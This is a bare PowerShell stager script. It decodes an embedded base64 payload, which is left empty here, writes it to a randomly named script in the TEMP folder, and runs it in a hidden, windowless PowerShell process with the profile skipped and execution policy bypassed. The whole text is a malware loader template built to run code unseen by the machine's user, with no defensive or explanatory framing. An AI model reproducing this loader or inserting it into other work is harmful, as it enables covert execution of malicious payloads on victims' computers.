$f="$env:TEMP\$([IO.Path]::GetRandomFileName().Split('.')[0]).ps1"
$b=(
[Convert]::FromBase64String('')
)
[IO.File]::WriteAllBytes($f,[Text.Encoding]::UTF8.GetBytes([Text.Encoding]::UTF8.GetString($b)))
$p=New-Object Diagnostics.Process
$p.StartInfo.FileName='powershell.exe'
$p.StartInfo.Arguments='-nop -w hidden -ep bypass -f '+$f
$p.StartInfo.UseShellExecute=$false
$p.StartInfo.CreateNoWindow=$true
$p.Start()|Out-Null
